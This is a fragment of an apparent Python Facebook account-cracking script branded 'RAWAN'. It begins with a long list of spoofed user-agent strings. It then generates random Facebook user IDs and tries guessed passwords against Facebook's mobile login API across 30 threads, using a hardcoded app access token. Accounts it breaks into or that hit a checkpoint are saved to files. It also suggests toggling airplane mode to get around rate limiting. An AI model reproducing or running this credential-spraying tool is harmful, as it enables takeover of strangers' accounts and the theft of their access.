"Mozilla/5.0 (Linux; Android 10; SM-A600FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12.0.0; Mi 11 Pro) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.44",
"Mozilla/5.0 (Linux; Android 13; IN2013 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]",
"Mozilla/5.0 (Linux; arm_64; Android 12; SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.4.94.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5715.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4395.117 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-G996B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.25.113;]/FB_MEXT_IAB",
"Mozilla/5.0 (Linux; Android 13; 2106118C Build/TKQ1.220829.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; LM-G810 Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 7.0; Neffos X1 Max Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.127 Mobile Safari/537.36 [FB_IAB/FB4A;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Mobile/15E148 Snapchat/12.49.0.51 (like Safari/8615.2.9.10.4, panda)",
"Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Unique/91.7.8706.7",
"Mozilla/5.0 (iPhone CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 FBAN/FBIOSFBDV/iPhone12,1FBMD/iPhoneFBSN/iOSFBSV/16.6FBSS/2FBID/phoneFBLC/en_Qaau_GBFBOP/5",
"Mozilla/5.0 (Linux; Android 12; 22126RN91Y Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0; wbxapp 1.0.0; zoomrc 4.4.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; Tablet PC 2.0; zoomrc 4.4.0)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 Windows-AzureAD-Authentication-Provider/1.0",
"Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (Linux; Android 10; SM-G9600 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.79 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; DRA-L01 Build/HUAWEIDRA-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 Unique/97.7.8376.77",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]",
"Mozilla/5.0 (Linux; Android 13; SM-S906B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Home Assistant/2023.8.2-10992 (Android 13; SM-S906B)",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A805F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 BytedanceWebview/d8a21c6 musical_ly_31.0.0 JsSdk/2.0 NetType/WIFI Channel/App Store ByteLocale/en Region/US FalconTag/C496EBC9-525F-49B9-8846-62DFF27D2CCF",
"Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTBS29.401-58-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Home Assistant/2023.8.2-10992 (Android 13; Pixel 7)",
"Mozilla/5.0 (Linux; Android 11; Lenovo TB-X306X Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.226 Safari/537.36 GNews Android/2022143610",
"Mozilla/5.0 (Linux; Android 11; M2010J19SY Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Config/99.2.2481.82",
"Mozilla/5.0 (Linux; Android 9; STK-LX1 Build/HUAWEISTK-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2873.84 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5740.27 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 10; BMH-AN10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.7.58.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2890.86 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; SM-N970U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5750.44 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; arm_64; Android 12; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5785.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5895.173 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; rv:2.0b6pre) Gecko/20100908 Firefox/4.0b6pre",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Trailer/97.3.5042.43",
"Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2357 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A235M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; 22011119UY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Build/NMA26.42-28; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/299.0.0.51.236;]",
"Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT; Android 11; M) AppleWebKit/533.84 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/533.84",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A600AZ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 AtContent/92.5.8544.45",
"Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 DuckDuckGo/5 Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; RMX3231 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]",
"Mozilla/5.0 (Linux; Android 8.0.0; LG-H850 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 9; ASUS_A001D Build/PPR1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 GNews Android/2022089220",
"Mozilla/5.0 (Linux; Android 10; moto e(7) Build/QOGS30.569-83-18; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A205G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J410G Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.2 Chrome/107.0.5304.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 480dpi; 1080x2139; HUAWEI; POT-LX1; HWPOT-H; kirin710; it_IT; 510206032)",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 LikeWise/98.6.4725.26",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18F72 Instagram 298.0.0.19.114 (iPhone8,4; iOS 14_6; es_ES; es; scale=2.00; 640x1136; 509296496)",
"Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A226B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Trailer/97.3.8642.43",
"Mozilla/5.0 (Linux; Android 7.0; SM-T810 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 5a) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.44",
"Mozilla/5.0 (Linux; arm_64; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Pixel 6 Pro) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.43",
"Mozilla/5.0 (Linux; Android 12; 220733SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5225.114 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Nokia G20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4125.119 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5755.140 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; W-V755-EEA Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; X95Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]",
"Mozilla/5.0 (Linux; Android 12; moto g32 Build/S2SNS32.34-72-31-1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 7.0; FRD-L09 Build/HUAWEIFRD-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 Instagram 298.0.0.19.114 (iPhone15,3; iOS 16_5_1; en_US; en; scale=3.00; 1290x2796; 509296496)",
"Mozilla/5.0 (Linux; Android 12; X10 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2363 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; LM-K410 Build/RKQ1.210420.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; CPH2359 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]",
"Mozilla/5.0 (Linux; Android 11; M2006C3LVG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/371.0.0.24.109;]",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_7_4; en-US) Gecko/20100101 Firefox/48.9",
"Mozilla/5.0 (Linux; Android 11; M2101K6G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ3A.230805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.14.108;]",
"Mozilla/5.0 (Linux; Android 10; W-V851-OPE Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_6_0; en-US) Gecko/20130401 Firefox/45.3",
"Mozilla/5.0 (Linux; Android 11; A55 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]",
"Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; V22) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; AFTALMO Build/PS7646.3550N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.170 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0",
"Mozilla/5.0 (Linux; Andr0id 10; BRAVIA 4K VH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36 OPR/46.0.2207.0 OMI/4.21.0.273.DIA6.234 HbbTV/1.5.1 (+DRM; Sony; KD-43X89J; PKG6.7283.0829EUA; ; com.sony.HE.G4.4K; ) sony.hbbtv.tv.G4.2021HE.4K LaTivu_1.0.1_2021",
"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2694.93 Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2357) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36 OPR/77.0.4095.74331",
"Mozilla/5.0 (Linux; Android 6.0; LG-X230 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]",
"Mozilla/5.0 (Linux; Android 11; SM-A032M Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/371.0.0.10.104;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B110 Instagram 298.0.0.19.114 (iPhone13,2; iOS 16_1_2; it_GB; it; scale=3.00; 1170x2532; 509296496)",
"Mozilla/5.0 (Linux; Android 13; SM-G990B2 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.0.45;]",
"Mozilla/5.0 (Linux; Android 12; RMX2170 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/280.0.561456782 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 12; SM-A125M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (31/12; 300dpi; 720x1465; samsung; SM-A125M; a12; mt6765; pt_BR; 510206687)",
"Mozilla/5.0 (Linux; Android 11; SM-A022M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]",
"Mozilla/5.0 (Linux; Android 9; H3113 Build/50.2.A.3.77; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; V2109 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_9) AppleWebKit/536.27 (KHTML, like Gecko) Chrome/49.0.1732.137 Safari/603",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-J415G Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; moto e40 Build/ROQS31.166-87-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (U; Linux i652 ) Gecko/20130401 Firefox/54.9",
"Mozilla/5.0 (iPad; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 Instagram 298.0.0.19.114 (iPad7,3; iPadOS 16_6; nl_BE; nl; scale=2.00; 750x1334; 509296496)",
"Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 320dpi; 720x1449; Xiaomi/Redmi; M2006C3MG; angelica; mt6765; pt_BR; 510206622)"
		])
		sys.stdout.write(
			"\r [ RAWAN ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth", "22581538",
				"x-fb-sim-hni", "24943",
				"x-fb-net-hni", "36567",
				"x-fb-connection-quRAWANty", "EXCELLENT",
				"x-fb-connection-type", "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent", 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H231H) AppleWebKit/537.36 (KHTML, like Gecko) 131.0.4931.92 Chrome/103.0.2.0 Safari/537.36', 
				"content-type", "application/x-www-form-urlencoded", 
				"x-fb-http-engine", "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ RAWAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-RAWAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ RAWAN-CP ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-RAWAN-CP.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

	def old2(self):
		x = 111111111
		xx = 999999999
		idx = "100001" 
		os.system('clear');print(logo)
		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice([
			"Mozilla/5.0 (Linux; Android 13; CPH2409 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
